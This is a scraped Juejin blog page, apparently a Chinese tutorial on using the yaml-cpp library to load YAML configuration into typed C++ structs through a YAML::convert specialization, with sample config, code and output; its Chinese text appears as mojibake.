itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="GetcharZp"/> <meta itemprop="url" content="https://juejin.cn/user/4328150938692264"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ‹’ç»ç¡¬ç¼–ç ï¼C++ é…ç½®æ–‡ä»¶ç®¡ç†ç¥å™¨ yaml-cpp å®æˆ˜æŒ‡å—
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4328150938692264/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    GetcharZp
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T08:37:09.000Z" title="Fri Jan 02 2026 08:37:09 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:2;font-weight:400;font-size:15px;overflow-x:hidden;color:#333;letter-spacing:1.2px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1:first-child,.markdown-body h2:first-child,.markdown-body h3:first-child,.markdown-body h4:first-child,.markdown-body h5:first-child,.markdown-body h6:first-child{margin-top:-1.5rem;margin-bottom:1rem}.markdown-body h1:before,.markdown-body h2:before,.markdown-body h3:before,.markdown-body h4:before,.markdown-body h5:before,.markdown-body h6:before{content:"#";display:inline-block;color:#3eaf7c;padding-right:.23em}.markdown-body h1{position:relative;font-size:2.5rem;margin-bottom:5px}.markdown-body h1:before{font-size:2.5rem}.markdown-body h2{padding-bottom:.5rem;font-size:2.2rem;border-bottom:1px solid #ececec}.markdown-body h3{font-size:1.5rem;padding-bottom:0}.markdown-body h4{font-size:1.25rem}.markdown-body h5{font-size:1rem}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body strong{color:#3eaf7c}.markdown-body img{max-width:100%;border-radius:2px;display:block;margin:auto}.markdown-body hr{border:none;border-top:1px solid #3eaf7c;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;overflow-x:auto;padding:.2rem .5rem;margin:0;color:#3eaf7c;font-size:.85em;background-color:rgba(27,31,35,.05);border-radius:3px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;border:.5rem solid #3eaf7c}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{font-weight:500;text-decoration:none;color:#3eaf7c;margin:0 5px}.markdown-body a:active,.markdown-body a:hover{text-decoration:none;border-bottom:1.5px solid #3eaf7c}.markdown-body a[href^=http]:after{content:url("data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTQiIGhlaWdodD0iMTQiPjxkZWZzPjxzdHlsZS8+PC9kZWZzPjxwYXRoIGQ9Ik04MzIgMTI4SDY0MHY2NGgxNDYuNzUyTDUyMS4zNzYgNDU3LjM3Nmw0NS4yNDggNDUuMjQ4TDgzMiAyMzcuMjQ4VjM4NGg2NFYxMjh6IiBmaWxsPSIjM2VhZjdjIi8+PHBhdGggZD0iTTc2OCA4MzJIMTkyVjI1NmgzNTJ2LTY0SDE2MGEzMiAzMiAwIDAwLTMyIDMydjY0MGEzMiAzMiAwIDAwMzIgMzJoNjQwYTMyIDMyIDAgMDAzMi0zMlY0ODBoLTY0djM1MnoiIGZpbGw9IiMzZWFmN2MiLz48L3N2Zz4=");margin-left:2px}.markdown-body a[href^="#"]:before{content:"#"}.markdown-body table{display:inline-block!important;font-size:13px;width:auto;max-width:100%;overflow:auto;border:1px solid #3eaf7c;border-collapse:collapse}.markdown-body thead{background:#3eaf7c;color:#fff;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(153,255,188,.1)}.markdown-body td,.markdown-body th{padding:4px 8px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#7b7878;padding:1px 23px;border-left:.5rem solid;border-color:#42b983;background-color:rgba(66,184,131,.1);position:relative;margin:14px 8px 0}.markdown-body blockquote:before{display:inline-block;position:absolute;content:url("data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjUiIGhlaWdodD0iMjUiIHZpZXdCb3g9IjAgMCAyNyAyNyIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48ZyB0cmFuc2Zvcm09InRyYW5zbGF0ZSgxLjg2MiAxLjg2MikiIGZpbGwtcnVsZT0ibm9uemVybyIgZmlsbD0ibm9uZSI+PGNpcmNsZSBzdHJva2U9IiNGRkYiIHN0cm9rZS13aWR0aD0iMS43MjQiIGZpbGw9IiM0MkI5ODMiIGN4PSIxMS42MzgiIGN5PSIxMS42MzgiIHI9IjExLjYzOCIvPjxwYXRoIGQ9Ik0xNC45NzggNi4yN0E1LjAwNiA1LjAwNiAwIDAwNi42NyA5LjQ2OGE0LjkwMSA0LjkwMSAwIDAwMS43NzMgNC4zNjJjLjMyMy4yNTguNTE0LjY0Ny41MjIgMS4wNnYxLjA2YTIuNjg1IDIuNjg1IDAgMDA1LjM3IDB2LTEuMDA4Yy4wMDItLjM5OC4xNzMtLjc3Ny40Ny0xLjA0MmE1LjAyMyA1LjAyMyAwIDAwLjE3My03LjYzem0tMy4zMzcgMTAuOTY3YTEuMzA0IDEuMzA0IDAgMDEtMS4yODYtMS4yODd2LS4yNzhoMi41NzJ2LjI2MWMwIC43MTMtLjU3MyAxLjI5NC0xLjI4NiAxLjMwNHptMi4yNi00LjQxNWMtLjQ0LjM4My0uNzUuODkzLS44ODcgMS40NmgtMi43NDZhMi44NjggMi44NjggMCAwMC0uOTM4LTEuNTNoLS4wMThhMy40NzYgMy40NzYgMCAwMS0xLjI2OS0zLjE0NSAzLjYxNSAzLjYxNSAwIDAxNy4xOTYuNCAzLjY1IDMuNjUgMCAwMS0xLjMzOCAyLjgxNXoiIGZpbGw9IiNGRkYiLz48L2c+PC9zdmc+");width:25px;height:25px;left:-16px;top:12px}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body details{outline:none;border:none;border-left:4px solid #3eaf7c;padding-left:10px;margin-left:4px}.markdown-body details summary{cursor:pointer;border:none;outline:none;background:#fff;margin:0 -17px}.markdown-body details summary::-webkit-details-marker{color:#3eaf7c}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body ol li::marker{color:#3eaf7c}.markdown-body ul li{list-style:none;padding-left:10px}.markdown-body ul li::marker{content:"â€¢";color:#3eaf7c}.markdown-body ul li.task-list-item:before{content:"";margin-right:0}.markdown-body input[type=checkbox]{vertical-align:text-bottom;box-shadow:inset 0 0 0 10px #fff}.markdown-body input[type=checkbox]:before{content:url("data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTYiIGhlaWdodD0iMTYiPjxkZWZzPjxzdHlsZS8+PC9kZWZzPjxwYXRoIGQ9Ik04NzcuMDU2IDE0Ni45NDR2NzMwLjExMkgxNDYuOTQ0VjE0Ni45NDRoNzMwLjExMnptMC0xMDQuMjc3SDE0Ni45NDRjLTU3LjYyOCAwLTEwNC4yNzcgNDYuNjQ5LTEwNC4yNzcgMTA0LjI3N3Y3MzAuMTEyYzAgNTcuNjI4IDQ2LjY0OSAxMDQuMjc3IDEwNC4yNzcgMTA0LjI3N2g3MzAuMTEyYzU3LjYyOCAwIDEwNC4yNzctNDYuNjQ5IDEwNC4yNzctMTA0LjI3N1YxNDYuOTQ0YzAtNTcuNjI4LTQ2LjY0OS0xMDQuMjc3LTEwNC4yNzctMTA0LjI3N3oiIGZpbGw9IiMzZWFmN2MiLz48L3N2Zz4=");position:relative;top:-2px;right:2px}.markdown-body input[type=checkbox]:checked:before{content:url("data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTUiIGhlaWdodD0iMTUiPjxkZWZzPjxzdHlsZS8+PC9kZWZzPjxwYXRoIGQ9Ik05MTAuMjA4IDBIMTEzLjc2QTExNC4xMTIgMTE0LjExMiAwIDAwLS4wMzIgMTEzLjc5MlY5MTAuMjRjMCA2Mi41OTIgNTEuMiAxMTMuNzkyIDExMy43OTIgMTEzLjc5Mmg3OTYuNDQ4YzYyLjU5MiAwIDExMy43OTItNTEuMiAxMTMuNzkyLTExMy43OTJWMTEzLjc5MkMxMDI0IDUxLjIgOTcyLjggMCA5MTAuMjA4IDB6bS01MTIgNzk2LjQ0OEwxMTMuNzYgNTEybDc5LjY0OC03OS42NDggMjA0LjggMjA0LjhMODMwLjU2IDIwNC44bDc5LjY0OCA3OS42NDgtNTEyIDUxMnoiIGZpbGw9IiMzZWFmN2MiLz48L3N2Zz4=");position:relative;top:-2px;right:2px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="monokai">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#272822;color:#ddd}.hljs-keyword,.hljs-literal,.hljs-name,.hljs-selector-tag,.hljs-strong,.hljs-tag{color:#f92672}.hljs-code{color:#66d9ef}.hljs-class .hljs-title{color:#fff}.hljs-attribute,.hljs-link,.hljs-regexp,.hljs-symbol{color:#bf79db}.hljs-addition,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-emphasis,.hljs-section,.hljs-selector-attr,.hljs-selector-pseudo,.hljs-string,.hljs-subst,.hljs-template-tag,.hljs-template-variable,.hljs-title,.hljs-type,.hljs-variable{color:#a6e22e}.hljs-comment,.hljs-deletion,.hljs-meta,.hljs-quote{color:#75715e}.hljs-doctag,.hljs-keyword,.hljs-literal,.hljs-section,.hljs-selector-id,.hljs-selector-tag,.hljs-title,.hljs-type{font-weight:700}</style><blockquote>
<p>è¿˜åœ¨é€šè¿‡ä¿®æ”¹ä»£ç æ¥è°ƒæ•´å‚æ•°ï¼Ÿè¿˜åœ¨æ‰‹å†™æå…¶è„†å¼±çš„ <code>.ini</code> è§£æå™¨ï¼Ÿæ˜¯æ—¶å€™å‡çº§ä½ çš„ C++ é…ç½®ç®¡ç†æ–¹æ¡ˆäº†ï¼æœ¬æ–‡æ·±å…¥è§£æ yaml-cpp åº“ï¼Œä»åŸºç¡€åŠŸèƒ½åˆ°é«˜çº§ç»“æ„ä½“æ˜ å°„ï¼Œæ‰‹æŠŠæ‰‹æ•™ä½ æ­å»ºä¸€å¥—ç±»å‹å®‰å…¨ã€æ˜“äºç»´æŠ¤çš„é…ç½®ç³»ç»Ÿã€‚é™„å®Œæ•´ä»£ç ç¤ºä¾‹ï¼Œå³æ‹·å³ç”¨ã€‚</p>
<p>GitHub åœ°å€ï¼š <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fjbeder%2Fyaml-cpp" target="_blank" title="https://github.com/jbeder/yaml-cpp" ref="nofollow noopener noreferrer">github.com/jbeder/yamlâ€¦</a></p>
</blockquote>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c3c2090ac7314fc5a83c88654197b1b7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR2V0Y2hhclpw:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767947829&amp;x-signature=cO0LGGe96lLnyFU0GME3JuB6GCI%3D" alt="image.png" loading="lazy"/></p>
<p>åœ¨ C++ é¡¹ç›®å¼€å‘ä¸­ï¼Œé…ç½®ç®¡ç†æ˜¯ä¸€ä¸ªç»•ä¸å¼€çš„è¯é¢˜ã€‚æ— è®ºæ˜¯æœåŠ¡ç«¯ç¨‹åºçš„ç«¯å£ç›‘å¬ã€æ•°æ®åº“è¿æ¥æ± å¤§å°ï¼Œè¿˜æ˜¯æ¸¸æˆå®¢æˆ·ç«¯çš„åˆ†è¾¨ç‡ã€éŸ³é‡è®¾ç½®ï¼Œæˆ‘ä»¬éƒ½ä¸å¸Œæœ›æ¯æ¬¡è°ƒæ•´å‚æ•°éƒ½éœ€è¦é‡æ–°ç¼–è¯‘ä»£ç ã€‚</p>
<p><strong>YAML</strong> ä»¥å…¶æé«˜çš„å¯è¯»æ€§å’Œå¯¹æ•°æ®ç»“æ„çš„è‰¯å¥½æ”¯æŒï¼Œæˆä¸ºäº†ç°ä»£è½¯ä»¶é…ç½®çš„é¦–é€‰æ ¼å¼ã€‚è€Œåœ¨ C++ ç”Ÿæ€ä¸­ï¼Œ<strong>yaml-cpp</strong> åˆ™æ˜¯å¤„ç† YAML æ–‡ä»¶çš„äº‹å®æ ‡å‡†åº“ã€‚</p>
<h3 data-id="heading-0">yaml-cpp æ˜¯ä»€ä¹ˆï¼Ÿ</h3>
<p><code>yaml-cpp</code> æ˜¯ä¸€ä¸ªå¼€æºçš„ C++ åº“ï¼Œç”¨äºè§£æå’Œç”Ÿæˆ YAML æ–‡æ¡£ã€‚å®ƒå®Œå…¨ç¬¦åˆ YAML 1.2 è§„èŒƒï¼Œå¹¶ä¸”åˆ©ç”¨ C++ çš„æ¨¡æ¿ç‰¹æ€§æä¾›äº†ç±»å‹å®‰å…¨çš„æ¥å£ã€‚</p>
<h4 data-id="heading-1">æ ¸å¿ƒåŠŸèƒ½ï¼š</h4>
<ol>
<li><strong>åŠ è½½ (Loading)ï¼š</strong> å°† YAML æ–‡ä»¶è§£æä¸ºå†…å­˜ä¸­çš„èŠ‚ç‚¹æ ‘ï¼ˆNode Treeï¼‰ã€‚</li>
<li><strong>å‘å°„ (Emitting)ï¼š</strong> å°†å†…å­˜æ•°æ®åºåˆ—åŒ–ä¸º YAML æ ¼å¼å¹¶ä¿å­˜ã€‚</li>
<li><strong>ç±»å‹è½¬æ¢ï¼š</strong> è‡ªåŠ¨å¤„ç† int, float, string, bool, std::vector, std::map ç­‰å¸¸è§ç±»å‹çš„è½¬æ¢ã€‚</li>
<li><strong>STL å…¼å®¹ï¼š</strong> æ¥å£è®¾è®¡ç¬¦åˆ C++ æ ‡å‡†åº“ä¹ æƒ¯ï¼Œä½¿ç”¨è¿­ä»£å™¨éå†åºåˆ—å’Œæ˜ å°„ã€‚</li>
</ol>
<h3 data-id="heading-2">ä¼˜ç¼ºç‚¹ä¸é€‚ç”¨åœºæ™¯</h3>
<p><strong>ä¼˜ç‚¹ï¼š</strong></p>
<ul>
<li><strong>API å‹å¥½ï¼š</strong> ä½¿ç”¨ <code>operator[]</code> è®¿é—®èŠ‚ç‚¹ï¼Œåƒæ“ä½œ <code>std::map</code> ä¸€æ ·è‡ªç„¶ã€‚</li>
<li><strong>æˆç†Ÿç¨³å®šï¼š</strong> è¢«å¹¿æ³›åº”ç”¨äº ROS (æœºå™¨äººæ“ä½œç³»ç»Ÿ)ã€å„ç±»æ¸¸æˆå¼•æ“åŠé«˜æ€§èƒ½æœåŠ¡å™¨ä¸­ã€‚</li>
<li><strong>è·¨å¹³å°ï¼š</strong> åŸºäº CMake æ„å»ºï¼Œæ”¯æŒ Windows, Linux, MacOSã€‚</li>
<li><strong>å¼ºå¤§çš„è‡ªå®šä¹‰æ”¯æŒï¼š</strong> å¯ä»¥é€šè¿‡æ¨¡æ¿ç‰¹åŒ–ï¼Œç›´æ¥å°† YAML èŠ‚ç‚¹æ˜ å°„ä¸ºè‡ªå®šä¹‰ C++ ç»“æ„ä½“ã€‚</li>
</ul>
<p><strong>ç¼ºç‚¹ï¼š</strong></p>
<ul>
<li><strong>ç¼–è¯‘ä¾èµ–ï¼š</strong> éœ€è¦é›†æˆåˆ°æ„å»ºç³»ç»Ÿä¸­ã€‚</li>
<li><strong>æ€§èƒ½ï¼š</strong> å¯¹äºå‡ ç™¾ MB çš„å·¨å‹æ•°æ®æ–‡ä»¶ï¼Œè§£æé€Ÿåº¦ä¸å¦‚çº¯ C å®ç°çš„è§£æå™¨ï¼ˆä½†åœ¨é…ç½®æ–‡ä»¶åœºæ™¯ä¸‹ï¼Œæ€§èƒ½å®Œå…¨ä¸æ˜¯ç“¶é¢ˆï¼‰ã€‚</li>
<li><strong>å¼‚å¸¸å¤„ç†ï¼š</strong> å½“ Key ä¸å­˜åœ¨æ—¶ï¼Œå¦‚æœå¤„ç†ä¸å½“å®¹æ˜“æŠ›å‡ºå¼‚å¸¸ï¼Œéœ€è¦ä¸¥è°¨çš„ä»£ç é˜²å¾¡ã€‚</li>
</ul>
<p><strong>é€‚ç”¨åœºæ™¯ï¼š</strong></p>
<ul>
<li>åº”ç”¨ç¨‹åºçš„å¯åŠ¨é…ç½®æ–‡ä»¶ (<code>config.yaml</code>)ã€‚</li>
<li>æ¸¸æˆå…³å¡æ•°æ®ã€ç‰©å“å±æ€§è¡¨ã€‚</li>
<li>æ·±åº¦å­¦ä¹ æ¨¡å‹çš„è¶…å‚æ•°é…ç½®ã€‚</li>
<li>å¤šæœåŠ¡é—´çš„æ•°æ®åºåˆ—åŒ–äº¤æ¢ã€‚</li>
</ul>
<h3 data-id="heading-3">å®æˆ˜ï¼šåƒä¸“ä¸šäººå£«ä¸€æ ·ç®¡ç†é…ç½®</h3>
<p>å¾ˆå¤šåˆå­¦è€…ä½¿ç”¨ yaml-cpp æ—¶ï¼Œä»£ç é‡Œå……æ–¥ç€ <code>config["server"]["port"].as&lt;int&gt;()</code> è¿™æ ·çš„ç¡¬ç¼–ç å­—ç¬¦ä¸²ã€‚è¿™ç§æ–¹å¼éå¸¸è„†å¼±ï¼šä¸€æ—¦ YAML ç»“æ„å˜äº†ï¼Œæˆ–è€… Key æ‹¼å†™é”™è¯¯ï¼Œç¨‹åºå°±ä¼šåœ¨è¿è¡Œæ—¶å´©æºƒã€‚</p>
<p><strong>æœ€ä½³å®è·µæ˜¯ï¼šå®šä¹‰ C++ ç»“æ„ä½“ï¼Œå¹¶åˆ©ç”¨ <code>YAML::convert</code> è¿›è¡Œè‡ªåŠ¨æ˜ å°„ã€‚</strong></p>
<p>å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªæœåŠ¡å™¨é¡¹ç›®ï¼Œéœ€è¦é…ç½®æœåŠ¡å™¨åŸºæœ¬ä¿¡æ¯ã€‚</p>
<h4 data-id="heading-4">1. å‡†å¤‡ YAML é…ç½®æ–‡ä»¶ (<code>conf.yaml</code>)</h4>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">service:</span>
  <span class="hljs-attr">name:</span> <span class="hljs-string">vision-tool</span>
  <span class="hljs-attr">port:</span> <span class="hljs-number">9605</span>
  <span class="hljs-attr">log_path:</span> <span class="hljs-string">/opt/up-zero/vision_tool/log/tool.log</span>
</code></pre>
<h4 data-id="heading-5">2. å®šä¹‰ C++ é…ç½®ç»“æ„ä½“</h4>
<p>æˆ‘ä»¬åœ¨ C++ ä¸­å®šä¹‰ä¸ YAML ç»“æ„ä¸€ä¸€å¯¹åº”çš„ <code>struct</code>ã€‚</p>
<pre><code class="hljs language-c++" lang="c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;yaml-cpp/yaml.h&gt;</span></span>

<span class="hljs-keyword">struct</span> <span class="hljs-title class_">AppConfig</span>
{
    std::string name;     <span class="hljs-comment">// åº”ç”¨åç§°</span>
    <span class="hljs-type">int</span> port;             <span class="hljs-comment">// ç›‘å¬ç«¯å£</span>
    std::string log_path; <span class="hljs-comment">// æ—¥å¿—è·¯å¾„</span>
};
</code></pre>
<h4 data-id="heading-6">3. å®ç° <code>YAML::convert</code> ç‰¹åŒ– (æ ¸å¿ƒæ­¥éª¤)</h4>
<p>è¿™æ˜¯ yaml-cpp æœ€å¼ºå¤§çš„åœ°æ–¹ã€‚æˆ‘ä»¬åœ¨ <code>YAML</code> å‘½åç©ºé—´å†…ç‰¹åŒ– <code>convert</code> æ¨¡æ¿ï¼Œè¿™æ ·å°±å¯ä»¥ç›´æ¥è°ƒç”¨ <code>node.as&lt;AppConfig&gt;()</code> äº†ã€‚</p>
<pre><code class="hljs language-c++" lang="c++"><span class="hljs-keyword">namespace</span> YAML {
    <span class="hljs-keyword">template</span>&lt;&gt;
    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">convert</span>&lt;AppConfig&gt; {
        <span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">bool</span> <span class="hljs-title">decode</span><span class="hljs-params">(<span class="hljs-type">const</span> Node&amp; node, AppConfig&amp; rhs)</span> </span>{
            <span class="hljs-keyword">if</span>(!node.<span class="hljs-built_in">IsMap</span>()) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;

            <span class="hljs-comment">// è¯»å– service å—</span>
            <span class="hljs-keyword">if</span>(node[<span class="hljs-string">"service"</span>]) {
                <span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>&amp; serviceNode = node[<span class="hljs-string">"service"</span>];
                rhs.name = serviceNode[<span class="hljs-string">"name"</span>].<span class="hljs-built_in">as</span>&lt;std::string&gt;();
                rhs.port = serviceNode[<span class="hljs-string">"port"</span>].<span class="hljs-built_in">as</span>&lt;<span class="hljs-type">int</span>&gt;();
                rhs.log_path = serviceNode[<span class="hljs-string">"log_path"</span>].<span class="hljs-built_in">as</span>&lt;std::string&gt;();
            }
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        }
    }; 
}
</code></pre>
<h4 data-id="heading-7">4. å®Œæ•´çš„åŠ è½½ä¸æµ‹è¯•ä»£ç </h4>
<p>ç°åœ¨ï¼Œæˆ‘ä»¬çš„ä¸»é€»è¾‘ä»£ç å°†å˜å¾—å¼‚å¸¸æ¸…çˆ½ï¼š</p>
<pre><code class="hljs language-c++" lang="c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-keyword">try</span> {
        <span class="hljs-comment">// 1. åŠ è½½æ–‡ä»¶</span>
        YAML::Node config = YAML::<span class="hljs-built_in">LoadFile</span>(<span class="hljs-string">"../conf/conf.yaml"</span>);

        <span class="hljs-comment">// 2. ä¸€é”®è½¬æ¢ä¸º C++ ç»“æ„ä½“</span>
        AppConfig appConfig = config.<span class="hljs-built_in">as</span>&lt;AppConfig&gt;();

        <span class="hljs-comment">// 3. ä½¿ç”¨é…ç½® (å®Œå…¨æ˜¯å¼ºç±»å‹çš„ C++ å¯¹è±¡æ“ä½œ)</span>
        std::cout &lt;&lt; <span class="hljs-string">"--- Config Loaded ---"</span> &lt;&lt; std::endl;
        std::cout &lt;&lt; <span class="hljs-string">"Server Name: "</span> &lt;&lt; appConfig.name &lt;&lt; std::endl;
        std::cout &lt;&lt; <span class="hljs-string">"Port: "</span> &lt;&lt; appConfig.port &lt;&lt; std::endl;
        std::cout &lt;&lt; <span class="hljs-string">"Log Path: "</span> &lt;&lt; appConfig.log_path &lt;&lt; std::endl;

    } <span class="hljs-built_in">catch</span> (<span class="hljs-type">const</span> YAML::BadFile&amp; e) {
        std::cerr &lt;&lt; <span class="hljs-string">"Error: Config file not found!"</span> &lt;&lt; std::endl;
        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;
    } <span class="hljs-built_in">catch</span> (<span class="hljs-type">const</span> YAML::ParserException&amp; e) {
        std::cerr &lt;&lt; <span class="hljs-string">"Error: YAML syntax error: "</span> &lt;&lt; e.<span class="hljs-built_in">what</span>() &lt;&lt; std::endl;
        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;
    } <span class="hljs-built_in">catch</span> (<span class="hljs-type">const</span> std::exception&amp; e) {
        std::cerr &lt;&lt; <span class="hljs-string">"Error: "</span> &lt;&lt; e.<span class="hljs-built_in">what</span>() &lt;&lt; std::endl;
        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;
    }
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<p>è¾“å‡ºï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">---</span> <span class="hljs-string">Config</span> <span class="hljs-string">Loaded</span> <span class="hljs-string">---</span>
<span class="hljs-attr">Server Name:</span> <span class="hljs-string">vision-tool</span>
<span class="hljs-attr">Port:</span> <span class="hljs-number">9605</span>
<span class="hljs-attr">Log Path:</span> <span class="hljs-string">/opt/up-zero/vision_tool/log/tool.log</span>
</code></pre>
<h3 data-id="heading-8">ä¸ºä»€ä¹ˆè¿™ä¹ˆåšæ›´å¥½ï¼Ÿ</h3>
<ol>
<li><strong>è§£è€¦ (Decoupling)ï¼š</strong> ä¸šåŠ¡é€»è¾‘ä»£ç ä¸éœ€è¦çŸ¥é“ YAML çš„å­˜åœ¨ï¼Œå®ƒåªæ“ä½œ <code>AppConfig</code> ç»“æ„ä½“ã€‚æœªæ¥å¦‚æœä½ æƒ³æ¢æˆ JSON æˆ– XMLï¼Œåªéœ€è¦ä¿®æ”¹è½¬æ¢å±‚ï¼Œä¸šåŠ¡é€»è¾‘æ— éœ€å˜åŠ¨ã€‚</li>
<li><strong>å®‰å…¨æ€§ (Safety)ï¼š</strong> æ‰€æœ‰ç±»å‹è½¬æ¢éƒ½åœ¨åŠ è½½æ—¶å®Œæˆã€‚å¦‚æœ YAML æ ¼å¼é”™è¯¯ï¼Œç¨‹åºä¼šåœ¨å¯åŠ¨æ—¶æŠ¥é”™ï¼Œè€Œä¸æ˜¯åœ¨è¿è¡Œåˆ°æŸä¸€è¡Œä»£ç æ—¶çªç„¶å´©æºƒã€‚</li>
<li><strong>å¯ç»´æŠ¤æ€§ (Maintainability)ï¼š</strong> å¢åŠ æ–°é…ç½®é¡¹æ—¶ï¼Œåªéœ€åœ¨ç»“æ„ä½“åŠ ä¸ªå­—æ®µå¹¶åœ¨ <code>convert</code> é‡ŒåŠ ä¸€è¡Œæ˜ å°„ï¼Œæ¸…æ™°æ˜äº†ã€‚</li>
</ol>
<h3 data-id="heading-9">æ€»ç»“</h3>
